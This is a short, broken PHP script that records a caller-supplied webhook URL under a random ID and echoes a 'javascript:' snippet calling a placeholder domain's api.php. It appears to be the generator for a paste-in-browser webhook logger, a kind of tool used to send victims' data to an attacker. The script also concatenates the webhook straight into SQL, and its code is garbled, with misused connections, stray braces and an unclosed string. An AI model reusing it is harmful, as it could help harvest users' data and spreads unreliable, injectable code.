<?php
$con = mysqli_connect('','username','password','databasename');
$webhook = $_REQUEST['webhook'];
$id = rand(10,3433434);
// U need a database if u need help check out github
$con = mysqli_connect('','username','password','databasename');
// Check connection
$conn ="";
/** @noinspection PhpUndefinedFieldInspection */
if ($conn->connect_error) {
    /** @noinspection PhpUndefinedFieldInspection */
    die("Connection failed: " . $conn->connect_error);
}

// sql to create table
/** @noinspection SqlNoDataSourceInspection */
$sql = "INSERT INTO Logs (ID, Webhook)
VALUES ('".$id."', '".$webhook."')";

$con=new mysqli("localhost","username", "","password", "databasename");
  echo 'xJavascript:$.get("https://yourdomain/api.php?id='.$id.'");
} else {
  echo "Error:" . $conn->error;
}

$conn->close();
?>';